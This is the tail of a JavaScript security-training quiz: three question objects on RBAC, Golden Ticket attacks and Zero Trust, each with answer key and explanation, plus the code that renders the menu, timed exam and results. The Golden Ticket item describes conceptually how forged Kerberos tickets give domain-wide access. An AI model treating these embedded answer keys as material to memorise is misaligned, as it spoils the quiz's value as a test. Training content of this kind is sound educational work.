  { question: "What is RBAC (Role-Based Access Control)?", options: ["Restricting access based on time of day", "Assigning permissions to roles, then assigning users to roles", "Controlling access based on IP addresses", "Using biometric data for access decisions"], correct: 1, explanation: "RBAC assigns permissions to defined roles (e.g., admin, editor, viewer, auditor), then assigns users to roles. This simplifies permission management — instead of assigning individual permissions to each user, you manage role assignments. When an employee changes position, you change their role, not individual permissions. RBAC principles: least privilege (roles have minimum necessary permissions), separation of duties (no single role has conflicting permissions), and role hierarchy.", difficulty: "easy", category: "Identity & Access Management", tags: ["RBAC", "access control", "roles"], references: ["NIST RBAC Model"] },
  { question: "What is a Golden Ticket attack?", options: ["Stealing a user's session cookie", "Forging a Kerberos TGT using the krbtgt account hash, granting unlimited domain access", "Creating a fake SSL certificate", "Bypassing MFA using a hardware token"], correct: 1, explanation: "A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the krbtgt account's NTLM hash (obtained via DCSync or NTDS.dit extraction). With a Golden Ticket, the attacker can impersonate any user, access any resource, for any duration — effectively having persistent, undetectable domain admin access. The only remediation is resetting the krbtgt password TWICE (because AD keeps the current and previous password). Golden Tickets survive individual password resets.", difficulty: "hard", category: "Identity & Access Management", tags: ["Kerberos", "Golden Ticket", "AD"], references: ["MITRE T1558.001"] },
  { question: "What is Zero Trust security?", options: ["Trusting no one and blocking all network traffic", "A security model that requires continuous verification — never trust, always verify — regardless of network location", "A firewall configuration with zero open ports", "A policy of zero tolerance for security violations"], correct: 1, explanation: "Zero Trust eliminates the concept of a trusted internal network. Every access request is fully verified regardless of source: identity verification (strong MFA), device health check, least-privilege access, micro-segmentation, and continuous monitoring. Principles: 1) Verify explicitly (authenticate and authorize every request). 2) Use least-privilege access. 3) Assume breach (minimize blast radius, segment access, verify end-to-end encryption, use analytics for detection). Core components: identity, device, network, application, data protection.", difficulty: "medium", category: "Identity & Access Management", tags: ["Zero Trust", "architecture", "NIST"], references: ["NIST SP 800-207"] }
];

function shuffleArray(arr) { const a = [...arr]; for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; } return a; }

export function renderSecurityQuiz(container) {
  const categories = [...new Set(QUESTIONS.map(q => q.category))];
  let currentQuestions = [];
  let currentIndex = 0;
  let score = 0;
  let answers = [];
  let mode = "menu";
  let timerInterval = null;
  let startTime = 0;

  function renderMenu() {
    mode = "menu";
    container.innerHTML = `
      <div style="max-width:700px;margin:40px auto;padding:20px">
        <h1 style="margin:0 0 8px;font-size:1.8rem;font-weight:800;color:var(--txt,#f9fafb)">Security Training Quiz</h1>
        <p style="margin:0 0 24px;font-size:.9rem;color:var(--mut,#9ca3af)">${QUESTIONS.length} questions across ${categories.length} categories</p>
        <div style="display:grid;gap:12px">
          <button class="quiz-btn" data-mode="all" style="background:var(--acc,#00d4ff);color:#000;border:none;padding:14px;border-radius:8px;font-size:1rem;font-weight:700;cursor:pointer">Random Mix (20 questions)</button>
          <button class="quiz-btn" data-mode="exam" style="background:var(--surface,#111827);color:var(--txt,#f9fafb);border:1px solid var(--border,#1f2937);padding:14px;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer">Timed Exam (30 questions, 30 min)</button>
          <div style="margin-top:8px;font-size:.8rem;font-weight:700;color:var(--mut,#6b7280);text-transform:uppercase;letter-spacing:.06em">Category Drill</div>
          ${categories.map(c => {
            const count = QUESTIONS.filter(q => q.category === c).length;
            return `<button class="quiz-btn" data-mode="cat" data-cat="${c}" style="background:var(--surface,#111827);color:var(--txt,#f9fafb);border:1px solid var(--border,#1f2937);padding:12px;border-radius:8px;font-size:.9rem;cursor:pointer;text-align:left">${c} <span style="float:right;color:var(--mut,#6b7280)">${count}q</span></button>`;
          }).join("")}
        </div>
      </div>`;
    container.querySelectorAll(".quiz-btn").forEach(btn => {
      btn.onclick = () => {
        const m = btn.dataset.mode;
        if (m === "all") { currentQuestions = shuffleArray(QUESTIONS).slice(0, 20); }
        else if (m === "exam") { currentQuestions = shuffleArray(QUESTIONS).slice(0, 30); }
        else if (m === "cat") { currentQuestions = shuffleArray(QUESTIONS.filter(q => q.category === btn.dataset.cat)); }
        currentIndex = 0; score = 0; answers = [];
        startTime = Date.now();
        if (m === "exam") { timerInterval = setInterval(() => { const el = container.querySelector("#quiz-timer"); if (el) { const left = Math.max(0, 1800 - Math.floor((Date.now() - startTime) / 1000)); el.textContent = Math.floor(left / 60) + ":" + String(left % 60).padStart(2, "0"); if (left <= 0) { clearInterval(timerInterval); showResults(); } } }, 1000); }
        renderQuestion();
      };
    });
  }

  function renderQuestion() {
    mode = "question";
    const q = currentQuestions[currentIndex];
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const timeLeft = timerInterval ? Math.max(0, 1800 - elapsed) : null;
    container.innerHTML = `
      <div style="max-width:700px;margin:40px auto;padding:20px">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
          <span style="font-size:.8rem;color:var(--mut,#6b7280)">Question ${currentIndex + 1} of ${currentQuestions.length}</span>
          <div style="display:flex;gap:12px;align-items:center">
            ${timeLeft !== null ? `<span id="quiz-timer" style="font-size:.85rem;font-weight:700;color:${timeLeft < 60 ? '#ef4444' : 'var(--acc,#00d4ff)'}">${Math.floor(timeLeft / 60)}:${String(timeLeft % 60).padStart(2, "0")}</span>` : ""}
            <span style="font-size:.8rem;color:var(--acc,#00d4ff);font-weight:700">Score: ${score}/${currentIndex}</span>
          </div>
        </div>
        <div style="height:4px;background:var(--border,#1f2937);border-radius:2px;margin-bottom:20px"><div style="height:100%;width:${((currentIndex) / currentQuestions.length) * 100}%;background:var(--acc,#00d4ff);border-radius:2px;transition:width .3s"></div></div>
        <div style="display:flex;gap:8px;margin-bottom:12px">
          <span style="font-size:.7rem;padding:3px 8px;border-radius:4px;background:rgba(99,102,241,.15);color:#818cf8;border:1px solid rgba(99,102,241,.3)">${q.category}</span>
          <span style="font-size:.7rem;padding:3px 8px;border-radius:4px;background:${q.difficulty === 'easy' ? 'rgba(34,197,94,.15)' : q.difficulty === 'medium' ? 'rgba(234,179,8,.15)' : 'rgba(239,68,68,.15)'};color:${q.difficulty === 'easy' ? '#22c55e' : q.difficulty === 'medium' ? '#eab308' : '#ef4444'};border:1px solid ${q.difficulty === 'easy' ? 'rgba(34,197,94,.3)' : q.difficulty === 'medium' ? 'rgba(234,179,8,.3)' : 'rgba(239,68,68,.3)'}">${q.difficulty}</span>
        </div>
        <h2 style="margin:0 0 20px;font-size:1.15rem;font-weight:700;color:var(--txt,#f9fafb);line-height:1.5">${q.question}</h2>
        <div style="display:grid;gap:10px">
          ${q.options.map((o, i) => `<button class="quiz-option" data-idx="${i}" style="background:var(--surface,#111827);color:var(--txt,#f9fafb);border:1px solid var(--border,#1f2937);padding:14px 16px;border-radius:8px;font-size:.9rem;cursor:pointer;text-align:left;transition:border-color .15s">${String.fromCharCode(65 + i)}. ${o}</button>`).join("")}
        </div>
      </div>`;
    container.querySelectorAll(".quiz-option").forEach(btn => {
      btn.onmouseenter = () => btn.style.borderColor = "var(--acc,#00d4ff)";
      btn.onmouseleave = () => btn.style.borderColor = "var(--border,#1f2937)";
      btn.onclick = () => {
        const idx = parseInt(btn.dataset.idx);
        const correct = idx === q.correct;
        if (correct) score++;
        answers.push({ question: q, selected: idx, correct });
        container.querySelectorAll(".quiz-option").forEach((b, i) => {
          b.style.cursor = "default"; b.onclick = null; b.onmouseenter = null; b.onmouseleave = null;
          if (i === q.correct) { b.style.borderColor = "#22c55e"; b.style.background = "rgba(34,197,94,.1)"; }
          else if (i === idx && !correct) { b.style.borderColor = "#ef4444"; b.style.background = "rgba(239,68,68,.1)"; }
        });
        const explain = document.createElement("div");
        explain.style.cssText = "margin-top:16px;padding:16px;background:var(--surface,#111827);border:1px solid var(--border,#1f2937);border-radius:8px";
        explain.innerHTML = `<div style="font-size:.8rem;font-weight:700;color:${correct ? '#22c55e' : '#ef4444'};margin-bottom:6px">${correct ? '✓ Correct!' : '✗ Incorrect'}</div><p style="margin:0;font-size:.85rem;color:var(--mut,#d1d5db);line-height:1.6">${q.explanation}</p>`;
        const next = document.createElement("button");
        next.textContent = currentIndex + 1 < currentQuestions.length ? "Next Question →" : "See Results";
        next.style.cssText = "margin-top:12px;background:var(--acc,#00d4ff);color:#000;border:none;padding:10px 20px;border-radius:6px;font-size:.9rem;font-weight:700;cursor:pointer";
        next.onclick = () => { currentIndex++; if (currentIndex < currentQuestions.length) renderQuestion(); else showResults(); };
        explain.appendChild(next);
        container.querySelector("div[style*='max-width']").appendChild(explain);
      };
    });
  }

  function showResults() {
    if (timerInterval) clearInterval(timerInterval);
    mode = "results";
    const pct = Math.round((score / currentQuestions.length) * 100);
    const grade = pct >= 90 ? "A" : pct >= 80 ? "B" : pct >= 70 ? "C" : pct >= 60 ? "D" : "F";
    const gradeColor = pct >= 90 ? "#22c55e" : pct >= 70 ? "#eab308" : "#ef4444";
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const catBreakdown = {};
    for (const a of answers) {
      const c = a.question.category;
      if (!catBreakdown[c]) catBreakdown[c] = { total: 0, correct: 0 };
      catBreakdown[c].total++;
      if (a.correct) catBreakdown[c].correct++;
    }
    container.innerHTML = `
      <div style="max-width:700px;margin:40px auto;padding:20px">
        <h1 style="margin:0 0 20px;font-size:1.6rem;font-weight:800;color:var(--txt,#f9fafb)">Quiz Results</h1>
        <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px">
          <div style="background:var(--surface,#111827);border:1px solid var(--border,#1f2937);border-radius:12px;padding:20px;text-align:center">
            <div style="font-size:2.5rem;font-weight:800;color:${gradeColor}">${grade}</div>
            <div style="font-size:.8rem;color:var(--mut,#6b7280)">Grade</div>
          </div>
          <div style="background:var(--surface,#111827);border:1px solid var(--border,#1f2937);border-radius:12px;padding:20px;text-align:center">
            <div style="font-size:2.5rem;font-weight:800;color:var(--acc,#00d4ff)">${score}/${currentQuestions.length}</div>
            <div style="font-size:.8rem;color:var(--mut,#6b7280)">${pct}% Correct</div>
          </div>
          <div style="background:var(--surface,#111827);border:1px solid var(--border,#1f2937);border-radius:12px;padding:20px;text-align:center">
            <div style="font-size:2.5rem;font-weight:800;color:var(--txt,#f9fafb)">${Math.floor(elapsed / 60)}:${String(elapsed % 60).padStart(2, "0")}</div>
            <div style="font-size:.8rem;color:var(--mut,#6b7280)">Time</div>
          </div>
        </div>
        <h3 style="margin:0 0 12px;font-size:1rem;font-weight:700;color:var(--txt,#f9fafb)">Category Breakdown</h3>
        <div style="display:grid;gap:8px;margin-bottom:24px">
          ${Object.entries(catBreakdown).map(([cat, data]) => {
            const p = Math.round((data.correct / data.total) * 100);
            return `<div style="display:flex;align-items:center;gap:12px"><span style="width:200px;font-size:.82rem;color:var(--mut,#d1d5db)">${cat}</span><div style="flex:1;height:8px;background:var(--border,#1f2937);border-radius:4px"><div style="height:100%;width:${p}%;background:${p >= 70 ? '#22c55e' : p >= 50 ? '#eab308' : '#ef4444'};border-radius:4px"></div></div><span style="font-size:.8rem;color:var(--mut,#9ca3af);width:60px;text-align:right">${data.correct}/${data.total}</span></div>`;
          }).join("")}
        </div>
        <h3 style="margin:0 0 12px;font-size:1rem;font-weight:700;color:var(--txt,#f9fafb)">Review Incorrect Answers</h3>
        <div style="display:grid;gap:8px;margin-bottom:24px">
          ${answers.filter(a => !a.correct).map((a, i) => `
            <div style="background:var(--surface,#111827);border:1px solid #ef444433;border-radius:8px;padding:14px">
              <div style="font-size:.85rem;font-weight:600;color:var(--txt,#f9fafb);margin-bottom:6px">${a.question.question}</div>
              <div style="font-size:.78rem;color:#ef4444;margin-bottom:2px">Your answer: ${a.question.options[a.selected]}</div>
              <div style="font-size:.78rem;color:#22c55e;margin-bottom:6px">Correct: ${a.question.options[a.question.correct]}</div>
              <div style="font-size:.78rem;color:var(--mut,#9ca3af);line-height:1.5">${a.question.explanation}</div>
            </div>
          `).join("") || '<p style="font-size:.85rem;color:#22c55e">Perfect score — no incorrect answers!</p>'}
        </div>
        <button id="quiz-restart" style="background:var(--acc,#00d4ff);color:#000;border:none;padding:12px 24px;border-radius:8px;font-size:.95rem;font-weight:700;cursor:pointer">Try Again</button>
      </div>`;
    container.querySelector("#quiz-restart").onclick = renderMenu;
  }

  renderMenu();
}
